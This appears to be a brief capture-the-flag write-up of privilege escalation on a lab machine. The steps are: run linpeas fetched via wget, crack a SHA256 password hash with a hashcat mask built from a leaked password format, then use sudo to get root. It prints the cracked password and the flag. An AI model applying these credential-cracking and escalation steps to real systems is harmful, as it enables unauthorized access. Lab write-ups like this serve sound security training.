Used attack machine to start http server after we have linpeas.sh on it.

Went to /tmp file to get this file off our attack machine via wget https://github.com/peass-ng/PEASS-ng/releases/tag/20240630-b2cfbe8a 

./linpeas.sh

Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student

We found the hash of Susan’s password in the db file, let’s use hashcat to decrypt

echo “abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f” > hash.txt

hashcat -m 1400 hash.txt -a 3 susan_nasus_?d?d?d?d?d?d?d?d?d
	-Hashcat is using mode 1400 which is SHA256  encryption given input file hash.txt containing hash of Susan and specifies attack 3 which is brute-force the characters ?d which stands for integer value so susan_nasus_xxxxxxxxx

abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210


With the password we find what permissions susan has using sudo -l -S and login with password
so sudo -l shows all the executable we can run as root



We find out she has all permission so we do sudo su
And we are now root
Flag in root/root.txt : e54da971589275c7c4c29a0e5ed339f5
